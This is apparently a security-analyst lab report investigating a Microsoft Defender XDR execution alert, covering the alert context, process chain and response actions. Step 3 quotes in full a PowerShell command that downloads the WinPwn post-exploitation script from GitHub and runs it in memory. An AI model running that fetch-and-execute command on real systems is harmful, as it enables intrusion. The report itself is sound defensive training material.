# XDR: Execution

## Overview

This report documents investigating an Execution incident in Microsoft Defender XDR — a PowerShell process used to download and execute a remote post-exploitation script via a fileless, in-memory technique. I traced the incident from the alert queue through the command line, process chain, and Microsoft's recommended response actions.

## Investigation

### Step 1: Locate and Open the Alert

The incident "Hands-on keyboard attack was launched from a compromised account" (ID 17144) surfaced in the Incidents queue as a multi-stage incident, so other related alerts were expected — but the focus for this report is specifically the "A script with suspicious content was observed" alert within it. I opened that alert directly to begin the investigation.

[SCREENSHOT: Incident sidebar showing the list of alerts with Open alert page option]

### Step 2: Review Alert Context

On the alert page, I reviewed the core context:

- Device involved: vm-evil-xdr
- User account involved: vm-evil-xdr\evil-xdr
- Alert name: A script with suspicious content was observed
- Alert description: a script with suspicious content was observed running on this machine — such a script may be used for malware installation or other malicious activity
- Severity: Medium
- Detection technology: Amsi, Behavior, Network
- First/Last activity recorded: Apr 30, 2025, 4:14:41 PM

[SCREENSHOT: Alert page showing device, user, process tree, and alert description]

### Step 3: Review the Alert Timeline

1. Switched to the Alert timeline tab to see the specific event sequence rather than just the summary.
2. Reviewed the flagged event: `powershell.exe` executed a script, spawned from `powershell_ise.exe`.

[SCREENSHOT: Alert timeline showing the powershell_ise.exe to powershell.exe execution chain]

3. Reviewed the additional details available for this event:
   - Date and time the script was executed: 5/14/2026, 8:08:32 PM
   - Severity: Medium
   - Event: powershell.exe executed a script
   - Full script content, copyable for forensic review:
```powershell
"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
MS17-10 -noninteractive -consoleoutput}
```

This command uses `IEX` (Invoke-Expression) combined with `.NET WebClient.DownloadString` to pull a script directly from GitHub and execute it entirely in memory, without writing a file to disk — a classic fileless execution technique. The downloaded script, WinPwn, is a known offensive PowerShell post-exploitation framework, and the command references an MS17-10 module (an EternalBlue-related check) run non-interactively.

### Step 4: Review the Process Execution Details

1. Expanded the Remote execution dropdown on the flagged event to review the full process details.

[SCREENSHOT: Expanded process details for the powershell.exe execution]

2. Reviewed the specific fields:
   - Process ID: 5104
   - Execution details: Token elevation Default, Integrity level High
   - Image file path: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
   - Image file SHA1 hash
   - Image file creation and last modification time: Dec 6, 2025, 8:20:22 PM
   - Remote session initiator device name: LAPTOP-FKQ39MRR
   - Signer: Microsoft Windows, Issuer: Microsoft Windows Production PCA 2011

Confirming the binary was digitally signed by Microsoft is a reminder that the process itself (`powershell.exe`) was legitimate — the malicious activity came entirely from the command line arguments passed to it, not from a tampered or unsigned binary.

### Step 5: Recommendations and Response Actions

Recommended investigation steps for this alert:
- Examine the scripting tool's command line to understand what commands or scripts were executed.
- Search the script for further indicators — such as IP addresses (potential C2 servers) or dropped files.
- Explore the timeline of this and related machines for additional suspicious activity around the time of the alert.
- Inspect processes and files in the execution chain, and consider submitting suspicious files for deep analysis.

Available response actions if the alert is confirmed malicious:
- Run Antivirus Scan
- Collect Investigation Package for further analysis
- Restrict App Execution on the machine
- Initiate Automated Investigation
- Initiate Live Response Session to manually investigate the device
- Isolate Device to prevent lateral movement
- Go hunt — pivot into Advanced Hunting for further investigation across other machines

[SCREENSHOT: Device action menu showing response options including Isolate Device and Go hunt]

## Key Takeaways

- Fileless execution (`IEX` combined with `WebClient.DownloadString`) is designed specifically to evade detection that relies on scanning files written to disk — the entire malicious payload only ever exists in memory.
- A digitally signed, legitimate binary like `powershell.exe` isn't proof of safe activity on its own — what matters is what arguments and scripts were passed to it, which is why reviewing the full command line is the first recommended step.
- Cross-referencing a downloaded script's source (in this case, a public GitHub repo hosting a known offensive tool, WinPwn) against threat intelligence turns a suspicious command into a confirmed malicious one.
- Microsoft's built-in Recommendations tab gives a structured starting point for investigation, but pivoting into Advanced Hunting ("Go hunt") is what extends the investigation beyond a single device to check for the same activity elsewhere in the environment.

## Conclusion

I investigated an Execution alert involving a fileless PowerShell command that downloaded and ran the WinPwn post-exploitation tool from GitHub, confirmed the legitimate but weaponized use of `powershell.exe`, and reviewed the recommended containment and investigation actions available in Defender XDR.
